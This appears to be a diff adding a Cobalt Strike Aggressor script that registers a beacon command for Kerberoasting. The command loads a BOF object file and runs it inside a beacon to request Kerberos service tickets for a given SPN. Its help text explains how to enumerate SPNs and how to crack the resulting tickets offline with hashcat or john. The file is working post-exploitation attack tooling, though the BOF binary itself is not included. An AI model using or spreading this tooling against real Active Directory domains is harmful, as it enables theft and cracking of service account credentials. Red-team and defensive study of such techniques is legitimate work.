@@ -1,0 +1,59 @@
+# Kerberos TGS Request BOF Aggressor Script
+# Requests a Kerberos Service Ticket (TGS) for a specified SPN
+
+beacon_command_register(
+    "kerberos_tgs",
+    "Request a Kerberos TGS ticket for an SPN (Kerberoasting)",
+
+    "Request a Kerberos TGS ticket for a specified Service Principal Name.\n" .
+    "The ticket is output in a format suitable for offline cracking.\n\n" .
+
+    "Usage:\n" .
+    "   kerberos_tgs <SPN>\n\n" .
+
+    "Arguments:\n" .
+    "   \$1 - beacon id (automatically added by CS)\n" .
+    "   \$2 - Service Principal Name (SPN) to request ticket for\n\n" .
+
+    "Examples:\n" .
+    "   kerberos_tgs MSSQLSvc/sqlserver.corp.local:1433\n" .
+    "   kerberos_tgs HTTP/webserver.corp.local\n" .
+    "   kerberos_tgs cifs/fileserver.corp.local\n" .
+    "   kerberos_tgs MSSQLSvc/db01.domain.com\n\n" .
+
+    "Notes:\n" .
+    "   - The SPN must exist in the domain for the request to succeed\n" .
+    "   - Output can be cracked with hashcat (mode 13100) or john (krb5tgs format)\n" .
+    "   - Use 'setspn -Q */*' on a domain controller to enumerate SPNs\n"
+);
+
+alias kerberos_tgs {
+    local('$bid $spn $barch $handle $data $args');
+
+    # Parse arguments
+    ($bid, $spn) = @_;
+
+    # Validate SPN argument
+    if ($spn eq "") {
+        berror($bid, "Usage: kerberos_tgs <SPN>");
+        berror($bid, "Example: kerberos_tgs MSSQLSvc/sqlserver.corp.local:1433");
+        return;
+    }
+
+    # Log the task
+    btask($bid, "Requesting TGS ticket for SPN: $spn");
+
+    # Get beacon architecture
+    $barch = barch($bid);
+
+    # Read the appropriate BOF file
+    $handle = openf(script_resource("kerberos_tgs. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Pack arguments (z = null-terminated string)
+    $args = bof_pack($bid, "z", $spn);
+
+    # Execute the BOF
+    beacon_inline_execute($bid, $data, "go", $args);
+}
